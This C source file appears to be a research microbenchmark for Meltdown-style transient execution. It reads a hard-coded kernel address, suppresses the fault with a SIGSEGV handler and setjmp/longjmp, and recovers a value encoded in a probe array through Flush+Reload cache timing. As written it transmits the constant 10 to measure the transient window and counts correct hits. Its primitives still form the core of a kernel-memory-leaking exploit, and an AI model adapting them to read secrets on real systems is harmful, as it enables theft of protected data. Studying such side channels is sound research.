#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <setjmp.h>
#include <signal.h>
#include <string.h>
#include <stdarg.h>
#include <inttypes.h>
#include <time.h>

#define MEMORY_PAGE_SIZE 4096
#ifdef WINDOW
    #define XSTR(X) STR(X)
    #define STR(WINDOW) #WINDOW
#endif 

#define KERNEL_BASE_ADDRESS 0xffff88c300000000


uint8_t *userArray; 
static size_t reload_threshold; 
uint64_t *target = (uint64_t*) KERNEL_BASE_ADDRESS;
jmp_buf buf;
int samples = 100000;
FILE* output;

static void unblock_signal(int signum __attribute__ ((__unused__)))
{
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum)
{
    (void) signum;
    unblock_signal(SIGSEGV);
    // printf("Unblocked signal!");
    longjmp(buf, 1);    
}

void clflush(volatile void* Tx) {
    asm volatile("lfence;clflush (%0) \n" :: "c" (Tx));
}

static __inline__ uint64_t timer_start (void) {
        unsigned cycles_low, cycles_high;
        asm volatile ("CPUID\n\t"
                    "RDTSC\n\t"
                    "mov %%edx, %0\n\t"
                    "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low)::
                    "%rax", "%rbx", "%rcx", "%rdx");
        return ((uint64_t)cycles_high << 32) | cycles_low;
}

static __inline__ uint64_t timer_stop (void) {
        unsigned cycles_low, cycles_high;
        asm volatile("RDTSCP\n\t"
                    "mov %%edx, %0\n\t"
                    "mov %%eax, %1\n\t"
                    "CPUID\n\t": "=r" (cycles_high), "=r" (cycles_low):: "%rax",
                    "%rbx", "%rcx", "%rdx");
        return ((uint64_t)cycles_high << 32) | cycles_low;
}

#ifndef NOPS
#define NOPS ".rept 10\n"
#endif

static __inline__ void maccessFaulty(void *p)
{
    asm volatile(
        "mov (%%rcx), %%rax\n\t"
        // NOPS
        ".rept " 
    #ifdef WINDOW
        XSTR(WINDOW)
    #endif
        " nop\n\t"
        ".endr\n\t"
        "mov $10, %%rax\n\t"
        "shl $12, %%rax\n\t"
        "movq (%%rbx,%%rax,1), %%rbx\n\t"
        :: "c"(target), "b"(p)
        : "rax"
    );
}


static __inline__ void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

uint32_t reloadFaulty(void *p)
{
    uint64_t t1, t2;
    t1 = timer_start();
    maccessFaulty(p);
    t2 = timer_stop();
    return t2 - t1;
}

uint32_t reload(void *p)
{
    uint64_t t1, t2;
    t1 = timer_start();
    maccess(p);
    t2 = timer_stop();
    return t2 - t1;
}

int obtainData(int data)
{
    for (int k = 0; k < 256; k++)
    {
        clflush((void*) (userArray + (k * MEMORY_PAGE_SIZE)));
    }

    if (!setjmp(buf))
    {
        maccessFaulty((void*) (userArray));
    }
    uint32_t timing = 0;
    uint8_t sniffedData = 0;
    // printf("Value at 10th page is %d\n", *(userArray + (10 * MEMORY_PAGE_SIZE)));
    for (int k = 0; k < 256; k++) 
    {  

        timing = reload((void*) (userArray + (k * MEMORY_PAGE_SIZE)));
        if (timing < reload_threshold)
        {
            sniffedData = k;
            break;
        }
    }
    return sniffedData;
}

void setupCovertChannel()
{   
    size_t mallocSize = MEMORY_PAGE_SIZE * sizeof(uint8_t) * 256;
    userArray = malloc(mallocSize);
    memset(userArray, 0, mallocSize);
    // volatile uint8_t data = 10;
    int sniffedData;
    int correctCount = 0;
    for (int k = 0; k < 100000; k++) 
    {
        // data = 10;
        sniffedData = obtainData(10);
        // if ((sniffedData = obtainData(data)) != 10)
        if (sniffedData == 10)
        {       
            correctCount++;
        #ifdef DEBUG
            printf("Matched byte value is %d\n", sniffedData);
        #endif//DEBUG    

        }
    }
    fprintf(output, "%d\n", correctCount);
    printf("Matched %d correct bytes using covert channel\n", correctCount);
    
}

void findThreshold()
{
    size_t reloadTime = 0, flushReloadTime = 0, i, numTests=100000;
    void* addr = malloc(10);
    
    size_t *ptr = addr + 8;
    maccess(addr);
    for (i = 0; i < numTests; i++)
    {
        reloadTime += reload((void*) ptr);
    }

    for (i = 0; i < numTests; i++) 
    {
        flushReloadTime += reload((void*) ptr);
        clflush(addr);
    }

    reloadTime /= numTests;
    flushReloadTime /= numTests;
    reload_threshold = (reloadTime*.8) + (flushReloadTime*.2);
    printf("Reload time is %zu\t Flush+Reload time is %zu\n", reloadTime, flushReloadTime);
    printf("Threshold is %zu\n", reload_threshold);

}


int main(int argc, char** argv)
{
    printf(XSTR(WINDOW));
    output = fopen("results.txt", "a");
    if (signal(SIGSEGV, segfault_handler) == SIG_ERR)
    {
        printf("Unable to setup signal handler\n");
        return -1;
    }

    findThreshold();
    setupCovertChannel();
    return 0;
}